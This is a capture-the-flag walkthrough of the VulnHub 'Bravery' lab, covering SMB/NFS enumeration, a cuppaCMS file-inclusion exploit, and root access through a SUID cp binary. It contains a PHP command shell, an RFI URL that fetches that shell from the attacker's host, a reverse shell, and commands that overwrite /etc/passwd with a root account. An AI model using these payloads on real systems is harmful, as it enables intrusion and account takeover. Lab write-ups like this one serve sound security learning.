# Loot
## Possible Usernames
1. patrick
2. qiu
3. genevieve
4. david
5. kenny
6. qinyi
7. sara

## Possible Password
david: `qwertyuioplkjhgfdsazxcvbnm`
- mysql
	DB = `bravery`
	USER = `root`
	PASS = `r00tisawes0me`
	upload_default_path = `media/uploadsFiles`
	
## Confirmed Users
```bash
david:x:1000:1000:david:/home/david:/bin/bash
rick:x:1004:1004::/home/rick:/bin/bash
````

# Enumeration
## Ports
```bash
nmap -Pn -p22,53,80,111,139,443,445,2049,3306,8080,20048,33979,35671 -A  192.168.20.3
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-21 19:58 CST
Nmap scan report for BRAVERY (192.168.20.3)
Host is up (0.0039s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:z
|   2048 4d:8f:bc:01:49:75:83:00:65:a9:53:a9:75:c6:57:33 (RSA)
|   256 92:f7:04:e2:09:aa:d0:d7:e6:fd:21:67:1f:bd:64:ce (ECDSA)
|_  256 fb:08:cd:e8:45:8c:1a:c1:06:1b:24:73:33:a5:e4:77 (ED25519)
53/tcp    open  domain      dnsmasq 2.76
| dns-nsid:
|_  bind.version: dnsmasq-2.76
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: Apache HTTP Server Test Page powered by CentOS
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      33979/tcp   nlockmgr
|   100021  1,3,4      45255/tcp6  nlockmgr
|   100021  1,3,4      56304/udp6  nlockmgr
|   100021  1,3,4      58600/udp   nlockmgr
|   100024  1          35671/tcp   status
|   100024  1          40743/tcp6  status
|   100024  1          42301/udp6  status
|   100024  1          44105/udp   status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp   open  ssl/http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: Apache HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2018-06-10T15:53:25
|_Not valid after:  2019-06-10T15:53:25
|_ssl-date: TLS randomness does not represent time
445/tcp   open  netbios-ssn Samba smbd 4.7.1 (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     3 (RPC #100227)
3306/tcp  open  mysql       MariaDB (unauthorized)
8080/tcp  open  http        nginx 1.12.2
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 4 disallowed entries
|_/cgi-bin/ /qwertyuiop.html /private /public
|_http-server-header: nginx/1.12.2
|_http-title: Welcome to Bravery! This is SPARTA!
20048/tcp open  mountd      1-3 (RPC #100005)
33979/tcp open  nlockmgr    1-4 (RPC #100021)
35671/tcp open  status      1 (RPC #100024)

Host script results:
|_clock-skew: mean: 9h19m59s, deviation: 2h18m33s, median: 7h59m59s
|_nbstat: NetBIOS name: BRAVERY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.1)
|   Computer name: localhost
|   NetBIOS computer name: BRAVERY\x00
|   Domain name: \x00
|   FQDN: localhost
|_  System time: 2021-04-21T15:59:01-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-04-21T19:59:01
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.66 seconds
```

## WebSites
### Port 80
- /uploads   
	- could be file uploading entry
- /8
	- 80 and 8080 is your best friend
```bash
gobuster dir -u http://192.168.20.3 -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,htm,html,php,asp,aspx,jsp
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.20.3
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              aspx,jsp,txt,htm,html,php,asp
[+] Timeout:                 10s
===============================================================
2021/04/21 20:03:38 Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 79]
/1                    (Status: 200) [Size: 2]
/2                    (Status: 200) [Size: 2]
/3                    (Status: 200) [Size: 2]
/4                    (Status: 200) [Size: 2]
/contactus            (Status: 200) [Size: 27]
/5                    (Status: 200) [Size: 2]
/6                    (Status: 200) [Size: 2]
/9                    (Status: 200) [Size: 2]
/0                    (Status: 200) [Size: 2]
/8                    (Status: 200) [Size: 30]
/uploads              (Status: 301) [Size: 236] [--> http://192.168.20.3/uploads/]
/7                    (Status: 200) [Size: 2]
/README.txt           (Status: 200) [Size: 12]
/phpinfo.php          (Status: 200) [Size: 1]

===============================================================
2021/04/21 20:30:32 Finished
===============================================================
```
### Port 8080
- /robots.txt
```bash
gobuster dir -u http://192.168.20.3:8080 -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,htm,html,php,asp,aspx,jsp
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.20.3:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,htm,html,php,asp,aspx,jsp
[+] Timeout:                 10s
===============================================================
2021/04/21 20:03:39 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 2637]
/about                (Status: 200) [Size: 503]
/public               (Status: 301) [Size: 185] [--> http://192.168.20.3:8080/public/]
/private              (Status: 301) [Size: 185] [--> http://192.168.20.3:8080/private/]
/404.html             (Status: 200) [Size: 3650]
/robots.txt           (Status: 200) [Size: 103]

===============================================================
2021/04/21 20:31:46 Finished
===============================================================
```

# Samba
## anonymous share
```bash
[+] IP: 192.168.20.3:445	Name: BRAVERY             	Status: Guest session
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	anonymous                                         	READ ONLY
	secured                                           	NO ACCESS
```

- Since only anonymous is accessible for now
```bash
smbmap -u '' -r 'anonymous/' -H 192.168.20.3

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap


[+] IP: 192.168.20.3:445	Name: BRAVERY             	Status: Guest session
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	anonymous                                         	READ ONLY
	.\anonymous\\*
	dr--r--r--                0 Fri Sep 28 21:01:35 2018	.
	dr--r--r--                0 Fri Jun 15 00:30:39 2018	..
	dr--r--r--                0 Fri Sep 28 20:38:27 2018	patrick's folder
	dr--r--r--                0 Fri Sep 28 21:27:20 2018	qiu's folder
	dr--r--r--                0 Fri Sep 28 21:08:31 2018	genevieve's folder
	dr--r--r--                0 Wed Dec 26 10:19:51 2018	david's folder
	dr--r--r--                0 Fri Sep 28 20:52:49 2018	kenny's folder
	dr--r--r--                0 Fri Sep 28 20:45:22 2018	qinyi's folder
	dr--r--r--                0 Fri Sep 28 21:34:23 2018	sara's folder
	fr--r--r--              489 Fri Sep 28 21:54:03 2018	readme.txt
```
- Found not much useful information from this share, but at least we have lots of possible usernames.

- Tried to enumerate more
```bash
smbmap -u '' -R 'anonymous/' -H 192.168.20.3

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap


[+] IP: 192.168.20.3:445	Name: BRAVERY             	Status: Guest session
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	anonymous                                         	READ ONLY
	.\anonymous\\*
	dr--r--r--                0 Fri Sep 28 21:01:35 2018	.
	dr--r--r--                0 Fri Jun 15 00:30:39 2018	..
	dr--r--r--                0 Fri Sep 28 20:38:27 2018	patrick's folder
	dr--r--r--                0 Fri Sep 28 21:27:20 2018	qiu's folder
	dr--r--r--                0 Fri Sep 28 21:08:31 2018	genevieve's folder
	dr--r--r--                0 Wed Dec 26 10:19:51 2018	david's folder
	dr--r--r--                0 Fri Sep 28 20:52:49 2018	kenny's folder
	dr--r--r--                0 Fri Sep 28 20:45:22 2018	qinyi's folder
	dr--r--r--                0 Fri Sep 28 21:34:23 2018	sara's folder
	fr--r--r--              489 Fri Sep 28 21:54:03 2018	readme.txt
	.\anonymous\\patrick's folder\*
	dr--r--r--                0 Fri Sep 28 20:38:27 2018	.
	dr--r--r--                0 Fri Sep 28 21:01:35 2018	..
	dr--r--r--                0 Fri Sep 28 20:35:37 2018	movies!
...[snip]...
	fr--r--r--                0 Fri Sep 28 21:51:40 2018	fajd
	fr--r--r--                0 Fri Sep 28 21:51:40 2018	2ufa
	fr--r--r--                0 Fri Sep 28 21:51:40 2018	fs8d
```

- We can easily found that most of them are empty files, only some do have content, but by checking, are useless to us. There's `cuppaCMS`
```bash
cat note.txt 
Remind gen to set up my cuppaCMS account.
```

## Showmount
- Port 111 show mountd, so possibly nfs share exist, this can be showed by two ways:
	1. showmount -e <target>
	2. nmap -sV --script=nfs-showmount <target>
	
```bash
showmount -e 192.168.20.3
Exports list on 192.168.20.3:
/var/nfsshare                       *
````
OR
```bash
nmap -Pn -p111 -sV --script=nfs-showmount 192.168.20.3                                   130 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-21 21:38 CST
Nmap scan report for BRAVERY (192.168.20.3)
Host is up (0.0013s latency).

PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC #100000)
| nfs-showmount:
|_  /var/nfsshare *
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
...[snip]...
|_  100227  3           2049/udp6  nfs_acl

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.45 seconds
```

## Mount NFS Volume
```bash
┌[ChanninNicosMBP]─[17:15-23/04]─[/Users/cn/Documents/Writeups/VulnHub/Bravery]
└╼cn$ sudo mount -t nfs -o resvport 192.168.20.3:/var/nfsshare ~/bravery/mnt                                 

┌[ChanninNicosMBP]─[17:17-23/04]─[/Users/cn/Documents/Writeups/VulnHub/Bravery]
└╼cn$ ls -al ~/bravery/mnt
total 4
drwxrwxrwx 3 65534 65534 146 Dec 26  2018 .
drwxr-xr-x 7 cn    staff 224 Apr  3 20:42 ..
-rw-r--r-- 1 root  wheel  15 Dec 26  2018 README.txt
-rw-r--r-- 1 root  wheel  29 Dec 26  2018 discovery
-rw-r--r-- 1 root  wheel  51 Dec 26  2018 enumeration
-rw-r--r-- 1 root  wheel  20 Dec 26  2018 explore
drwxr-xr-x 2 root  wheel  19 Dec 26  2018 itinerary
-rw-r--r-- 1 root  wheel 104 Dec 26  2018 password.txt
-rw-r--r-- 1 root  wheel  67 Dec 26  2018 qwertyuioplkjhgfdsazxcvbnm
```
- Check all the files for useful information
```bash
┌[ChanninNicosMBP]─[17:22-23/04]─[/Users/cn/bravery/mnt]
└╼cn$ find . -ls -exec cat {} \;
51235873        1 drwxrwxrwx    3 65534            65534                 146 Dec 26  2018 .
cat: .: Is a directory
51235894        1 -rw-r--r--    1 root             wheel                  15 Dec 26  2018 ./README.txt
read me first!
51235895        1 -rw-r--r--    1 root             wheel                  67 Dec 26  2018 ./qwertyuioplkjhgfdsazxcvbnm
Sometimes, the answer you seek may be right before your very eyes.
51235896        1 -rw-r--r--    1 root             wheel                  29 Dec 26  2018 ./discovery
Remember to LOOK AROUND YOU!
51235897        1 -rw-r--r--    1 root             wheel                 104 Dec 26  2018 ./password.txt
Passwords should not be stored in clear-text, written in post-its or written on files on the hard disk!
51235898        1 -rw-r--r--    1 root             wheel                  20 Dec 26  2018 ./explore
Exploration is fun!
51235899        1 -rw-r--r--    1 root             wheel                  51 Dec 26  2018 ./enumeration
Enumeration is at the heart of a penetration test!
35269890        1 drwxr-xr-x    2 root             wheel                  19 Dec 26  2018 ./itinerary
cat: ./itinerary: Is a directory
35269905        4 -rw-r--r--    1 root             wheel                1733 Dec 26  2018 ./itinerary/david
David will need to fly to various cities for various conferences. Here is his schedule.

1 January 2019 (Tuesday):
New Year's Day. Spend time with family.

2 January 2019 (Wednesday):
0900: Depart for airport.
0945: Check in at Changi Airport, Terminal 3.
1355 - 2030 hrs (FRA time): Board flight (SQ326) and land in Frankfurt.
2230: Check into hotel.

3 January 2019 (Thursday):
0800: Leave hotel.
0900 - 1700: Attend the Banking and Enterprise Conference.
1730 - 2130: Private reception with the Chancellor.
2230: Retire in hotel.

4 January 2019 (Friday):
0800: Check out from hotel.
0900: Check in at Frankfurt Main.
1305 - 1355: Board flight (LH1190) and land in Zurich.
1600 - 1900: Dinner reception
2000: Check into hotel.

5 January 2019 (Saturday):
0800: Leave hotel.
0930 - 1230: Visit University of Zurich.
1300 - 1400: Working lunch with Mr. Pandelson
1430 - 1730: Dialogue with students at the University of Zurich.
1800 - 2100: Working dinner with Mr. Robert James Miller and wife.
2200: Check into hotel.

6 January 2019 (Sunday):
0730: Leave hotel.
0800 - 1100: Give a lecture on Software Security and Design at the University of Zurich.
1130: Check in at Zurich.
1715 - 2025: Board flight (LX18) and land in Newark.
2230: Check into hotel.

7 January 2019 (Monday):
0800: Leave hotel.
0900 - 1200: Visit Goldman Sachs HQ
1230 - 1330: Working lunch with Bill de Blasio
1400 - 1700: Visit McKinsey HQ
1730 - 1830: Visit World Trade Center Memorial
2030: Return to hotel.

8 January 2019 (Tuesday):
0630: Check out from hotel.
0730: Check in at Newark.
0945 - 1715 (+1): Board flight (SQ21)

9 January 2019 (Wednesday):
1715: Land in Singapore.
1815 - 2015: Dinner with wife.
2100: Clear local emails and head to bed.
````

- Only thing is that schedule for David, and one interesting file name `qwertyuioplkjhgfdsazxcvbnm`
	may be it's a password of david.

## Secured share
- Since david's information is showed along with the weird file name, my guess maybe this could try on secured share with david username.
```bash
┌[ChanninNicosMBP]─[17:37-23/04]─[/Users/cn/Documents/Writeups/VulnHub/Bravery]
└╼cn$ smbmap -u 'david' -p'qwertyuioplkjhgfdsazxcvbnm' -r 'secured/' -H 192.168.20.3                                                                                                                    2 ⨯

________  ___      ___  _______   ___      ___       __         _______
/"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
(:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
\___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
__/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
/" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
(_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
 SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
				 https://github.com/ShawnDEvans/smbmap


[+] IP: 192.168.20.3:445	Name: BRAVERY             	Status: Authenticated
	Disk                                                  	Permissions	Comment
----                                                  	-----------	-------
secured                                           	READ, WRITE
.\secured\\*
dr--r--r--                0 Sat Apr 24 01:37:55 2021	.
dr--r--r--                0 Fri Jun 15 00:30:39 2018	..
fr--r--r--              376 Sat Jun 16 16:36:07 2018	david.txt
fr--r--r--              398 Tue Jul 24 00:51:27 2018	genevieve.txt
fr--r--r--              323 Tue Jul 24 09:58:53 2018	README.txt
```
- After copied them to /tmp folder, I can check them all
```bash
┌[ChanninNicosMBP]─[17:37-23/04]─[/Users/cn/Documents/Writeups/VulnHub/Bravery]
└╼cn$ find /tmp/*.txt -ls -exec cat {} \;
8619863095        8 -rwx------    1 cn               wheel                 323 Jul 24  2018 /tmp/README.txt
README FOR THE USE OF THE BRAVERY MACHINE:

Your use of the BRAVERY machine is subject to the following conditions:

1. You are a permanent staff in Good Tech Inc.
2. Your rank is HEAD and above.
3. You have obtained your BRAVERY badges.

For more enquiries, please log into the CMS using the correct magic word: goodtech.
8619863093        8 -rwx------    1 cn               wheel                 376 Jun 16  2018 /tmp/david.txt
I have concerns over how the developers are designing their webpage. The use of "developmentsecretpage" is too long and unwieldy. We should cut short the addresses in our local domain.

1. Reminder to tell Patrick to replace "developmentsecretpage" with "devops".

2. Request the intern to adjust her Favourites to http://<developmentIPandport>/devops/directortestpagev1.php.
8619863094        8 -rwx------    1 cn               wheel                 398 Jul 24  2018 /tmp/genevieve.txt
Hi! This is Genevieve!

We are still trying to construct our department's IT infrastructure; it's been proving painful so far.

If you wouldn't mind, please do not subject my site (http://192.168.254.155/genevieve) to any load-test as of yet. We're trying to establish quite a few things:

a) File-share to our director.
b) Setting up our CMS.
c) Requesting for a HIDS solution to secure our host.
```

- Here's what we've got:
	Webpage: `developmentsecretpage`
	URL: `http://<developmentIPandport>/devops/directortestpagev1.php`
	cuppaCMS login pass: `goodtech`
	URL: `http://192.168.254.155/genevieve`

![](Pasted%20image%2020210423200045.png)

	
	# CMS RCE
- Tried to figure out cuppaCMS login credential, not smooth
- But here we've got an exploit
https://www.exploit-db.com/exploits/25971
![](Pasted%20image%2020210423200652.png)

- R/LFI
	http://192.168.254.155/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
![](Pasted%20image%2020210423200832.png)

```bash
┌[ChanninNicosMBP]─[20:09-23/04]─[/tmp]
└╼cn$ echo 'PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiYnJhdmVyeSI7CgkJcHVibGljICR1c2VyID0gInJvb3QiOwoJCXB1YmxpYyAkcGFzc3dvcmQgPSAicjAwdGlzYXdlczBtZSI7CgkJcHVibGljICR0YWJsZV9wcmVmaXggPSAiY3VfIjsKCQlwdWJsaWMgJGFkbWluaXN0cmF0b3JfdGVtcGxhdGUgPSAiZGVmYXVsdCI7CgkJcHVibGljICRsaXN0X2xpbWl0ID0gMjU7CgkJcHVibGljICR0b2tlbiA9ICJPQnFJUHFsRldmM1giOwoJCXB1YmxpYyAkYWxsb3dlZF9leHRlbnNpb25zID0gIiouYm1wOyAqLmNzdjsgKi5kb2M7ICouZ2lmOyAqLmljbzsgKi5qcGc7ICouanBlZzsgKi5vZGc7ICoub2RwOyAqLm9kczsgKi5vZHQ7ICoucGRmOyAqLnBuZzsgKi5wcHQ7ICouc3dmOyAqLnR4dDsgKi54Y2Y7ICoueGxzOyAqLmRvY3g7ICoueGxzeCI7CgkJcHVibGljICR1cGxvYWRfZGVmYXVsdF9wYXRoID0gIm1lZGlhL3VwbG9hZHNGaWxlcyI7CgkJcHVibGljICRtYXhpbXVtX2ZpbGVfc2l6ZSA9ICI1MjQyODgwIjsKCQlwdWJsaWMgJHNlY3VyZV9sb2dpbiA9IDA7CgkJcHVibGljICRzZWN1cmVfbG9naW5fdmFsdWUgPSAiZ29vZHRlY2giOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3JlZGlyZWN0ID0gImRvb3JzaGVsbC5qcGciOwoJfSAKPz4K' | base64 -d > config.php

┌[ChanninNicosMBP]─[20:09-23/04]─[/tmp]
└╼cn$ cat config.php                                                                                                                                                                                    1 ⚙
<?php
	class Configuration{
		public $host = "localhost";
		public $db = "bravery";
		public $user = "root";
		public $password = "r00tisawes0me";
		public $table_prefix = "cu_";
		public $administrator_template = "default";
		public $list_limit = 25;
		public $token = "OBqIPqlFWf3X";
		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
		public $upload_default_path = "media/uploadsFiles";
		public $maximum_file_size = "5242880";
		public $secure_login = 0;
		public $secure_login_value = "goodtech";
		public $secure_login_redirect = "doorshell.jpg";
	}
?>
```

- mysql
	DB = `bravery`
	USER = `root`
	PASS = `r00tisawes0me`
	upload_default_path = `media/uploadsFiles`
	
- Since we have LFI, we can use Burp to get more information
```bash
┌[ChanninNicosMBP]─[20:18-23/04]─[/tmp]
└╼cn$ echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApiaW46eDoxOjE6YmluOi9iaW46L3NiaW4vbm9sb2dpbgpk
...[snip]...mluL25vbG9naW4Kcmljazp4OjEwMDQ6MTAwNDo6L2hvbWUvcmljazovYmluL2Jhc2gK' | base64 -d | grep bash
root:x:0:0:root:/root:/bin/bash
david:x:1000:1000:david:/home/david:/bin/bash
rick:x:1004:1004::/home/rick:/bin/bash
```

- Now we use RFI
```bash
┌[ChanninNicosMBP]─[20:26-23/04]─[/tmp]
└╼cn$ echo '<?php system($_GET["cmd"]); ?>' > shell.php                                                                                                                             

┌[ChanninNicosMBP]─[20:26-23/04]─[/tmp]
└╼cn$ python3 -m http.server                                                             
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
::ffff:192.168.20.3 - - [23/Apr/2021 20:27:04] "GET /shell.php HTTP/1.0" 200 -
```

- Url
	http://192.168.254.155/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://192.168.20.1:8000/shell.php&cmd=id
![](Pasted%20image%2020210423202944.png)

- Now we can have our reverse shell
 ```bash
┌[ChanninNicosMBP]─[20:42-23/04]─[/Users/cn]
└╼cn$ bash

The default interactive shell is now zsh.
To update your account to use zsh, please run `chsh -s /bin/zsh`.
For more details, please visit https://support.apple.com/kb/HT208050.
bash-3.2$ nc -l 9001
sh: no job control in this shell
sh-4.2$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.2$ ^Z
[1]+  Stopped                 nc -l 9001
bash-3.2$ stty raw -echo
bash-3.2$ nc -l 9001

bash-4.2$ ls
alertConfigField.php  alertIFrame.php  alertImage.php  defaultAlert.php
bash-4.2$ export TERM=xterm
 ```
 
 
 # Privesc
## Normal run down
```bash
bash-4.2$ ls -al
total 0
drwxr-xr-x.  4 root  root   31 Dec 25  2018 .
dr-xr-xr-x. 18 root  root  254 Apr  3 12:01 ..
drwx------. 14 david david 279 Sep 29  2018 david
drwx------.  3 rick  rick   78 Jul 10  2018 rick

bash-4.2$ find / -uid 1000 -type f 2>/dev/null
/var/spool/mail/david
bash-4.2$ ls -al /var/spool/mail/david
-rw-rw----. 1 david mail 0 Jun 10  2018 /var/spool/mail/david
bash-4.2$ find / -uid 1004 -type f 2>/dev/null
/var/spool/mail/rick
bash-4.2$ ls -al /var/spool/mail/rick
-rw-rw----. 1 rick mail 0 Jul 10  2018 /var/spool/mail/rick
```

## linpeas.sh
1. /var/nfsshare  *(rw,sync,`no_root_squash`)
2. -rwsr-xr-x. 1 root root    152K Apr 11  2018 /usr/bin/`cp`
3. `/local.txt` - *Congratulations on obtaining a user shell. :)*

- And I think of two things:
	1. we have david's credential which can try to do su   -   nope, not working
	2. we have mysql login credential which maybe worth dig up

## mysql enum
### DB bravery
```bash
MariaDB [bravery]> select username,password from cu_users;
+-------------+----------------------------------+
| username    | password                         |
+-------------+----------------------------------+
| admin       | f49b7babc64b6bc99cb429b1dd2f10de |
| genevieve   | 57e5ee542f5d13648c5ab1e73f12140c |	genevieve
| david       | 6ccb05b8892eba2d8d5892278de39d4e |	jokesasidethisisfun
| qiu         | 16e8d1587723a4ddc28ff8117e6ad0e3 |	qiuuuuuuuuuu
| patrick     | 87e6d56ce79af90dbe07d387d3d0579e |	P@ssw0rd25
| qinyi       | 6d8c198696328b20997f26c1b504df24 |
| govindasamy | 5f4dcc3b5aa765d61d8327deb882cf99 |	password
| roland      | ee21d5f27a8401788147f6f6184ddb11 |	roland
+-------------+----------------------------------+
8 rows in set (0.01 sec)
```

### DB mysql
```bash
MariaDB [mysql]> select User,Password from user;
+------+-------------------------------------------+
| User | Password                                  |
+------+-------------------------------------------+
| root | *ED02A9E58E125F18C751D6C4E956F460C868F051 |
| root | *ED02A9E58E125F18C751D6C4E956F460C868F051 |
| root | *ED02A9E58E125F18C751D6C4E956F460C868F051 |
+------+-------------------------------------------+
3 rows in set (0.00 sec)
```

### DB test - empty set
 
 - This is back and forth stage, since we have the credentials, I go back to the cuppaCMS to test the account, and it's lucky that user genevieve is super admin.
 ![](Pasted%20image%2020210423213413.png)
 - But the CMS has nothing more, tried to su to david account by his credential not working.
 
 ## /usr/bin/cp
 - Well, I know that /usr/bin/cp could be an asset, but I never thought it's that good...
 ```bash
bash-4.2$ cp /etc/passwd /tmp/passwd
bash-4.2$ ls -al /tmp/passwd
-rw-r--r--. 1 root apache 2632 Apr 23 17:49 /tmp/passwd
bash-4.2$ cat /etc/passwd > /tmp/evil
bash-4.2$ perl -le 'print crypt("pwned", "whatever")'
whlU7j.8He1gc
bash-4.2$ echo 'evil:whlU7j.8He1gc:0:0::/root:/bin/bash' >> /tmp/evil
bash-4.2$ tail /tmp/evil
gnome-initial-setup:x:988:982::/run/gnome-initial-setup/:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
ossec:x:1001:1002::/var/ossec:/sbin/nologin
ossecm:x:1002:1002::/var/ossec:/sbin/nologin
ossecr:x:1003:1002::/var/ossec:/sbin/nologin
rick:x:1004:1004::/home/rick:/bin/bash
evil:whlU7j.8He1gc:0:0::/root:/bin/bash
bash-4.2$ cp /tmp/evil /etc/passwd
bash-4.2$ su evil
Password:
ABRT has detected 1 problem(s). For more info run: abrt-cli list --since 1545797712
[root@bravery shm]# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:httpd_t:s0
[root@bravery shm]# cat /root/proof.txt
Congratulations on rooting BRAVERY. :)
 ```
 
 